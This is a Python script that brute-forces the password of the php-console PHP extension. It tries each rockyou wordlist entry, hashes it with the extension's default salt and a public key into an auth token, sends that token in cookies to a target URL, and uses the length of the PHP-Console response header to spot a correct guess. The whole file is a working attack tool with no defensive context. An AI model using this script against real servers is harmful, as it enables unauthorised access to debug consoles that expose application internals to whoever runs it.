#!/usr/bin/env python3

#php-console extension password bruteforce

import requests
import hashlib
import base64
import json


url = "" # fill in
pubkey = "" # fill in


file = open('/usr/share/wordlists/rockyou.txt', 'r') 
success = 0
counter = 0
while success == 0:
    line = file.readline()

    string = line.strip() + "NeverChangeIt:)"
    hashed_string = hashlib.sha256(bytes(string, "utf-8")).hexdigest();
    pubkey_string = hashed_string + pubkey

    token = hashlib.sha256(bytes(pubkey_string, "utf-8")).hexdigest();
    complete = '{"php-console-client":5,"auth":{"publicKey":"54da31c1d58d6f96722fd5108cbcde0373050b8617ba6610fed9747f4ed8f8b0","token":"'+token+'"}}'
    
    completeBytes = base64.b64encode(complete.encode("utf-8"))
    completeStr = str(completeBytes, "utf-8")
    
    cookies = {"php-console-server": "5","php-console-client":completeStr}
    response = requests.post(url, cookies=cookies)
    headers = response.headers

    php_console_header = str(len(response.headers.get("PHP-Console")))
    
    if php_console_header != "249":        
        print("Cracked!" + line.strip())
        break
    else:
        counter += 1
        print(str(counter) + " " + php_console_header + " " + line.strip())
        
    



    
